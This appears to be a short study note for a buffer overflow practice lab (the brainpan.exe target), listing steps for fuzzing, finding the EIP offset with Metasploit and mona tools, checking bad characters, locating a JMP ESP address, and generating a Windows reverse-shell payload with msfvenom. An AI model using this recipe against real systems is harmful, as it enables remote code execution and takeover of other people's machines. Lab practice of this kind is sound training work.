# BOF
### 1. Check buffer length to trigger overflow  

### 2. Cofirm overflow length, append "A" * length  

### 3. Generate Offset to check EIP, ESP location  
  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

	Record value on EIP, select ESP and click "Follow in Dump"  
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value> -l <length>  

	Use !mona to find the offset after the overflow  
	!mona findmsp  

### 4. Confirm EIP by adding "B" * 4 after the number of offset. Also, add a number of "C" to track the number of characters that can be added after EIP to confirm length of shellcode

### 5. Check bad characters after EIP. common bad characters are 0x00, 0x0A, 0x20. Follow dump in ESP to check are there something missing after that.
Add code:

	badchar = [0x00]
	for ch in range (0x00 , 0xFF+1):
		if ch not in badchar:
			<payload> += chr(ch)

### 6. Find JMP ESP address in the system.
	JMP ESP = FFE4

	!mona jmp -r esp -cpb "\x00\x0A" << bad character

	!mona modules
	!mona find -s "\xff\xe4" -m brainpan.exe

	check the value of the address by naviate to it.
	Set breakpoint
	Change "B" in EIP to the address of JMP ESP << littile edian

	e.g. 0x311712f3 >> "\xf3\x12\x17\x31"

	Run again to check is the breakpoint triggered

### 7. Add shellcode
	Add a few \x90 before shellcode to avoid shellcode being modify

	msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"

### Bonus: Running out of shell code space?
Use the front of payload instead
1. Is there any register points to the front of our payload? EAX, EDX?
2. Check JMP register address
	/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

	JMP EAX/EBX/ECX/EDX

3. Append the address as shell code.
4. Add payload to the front





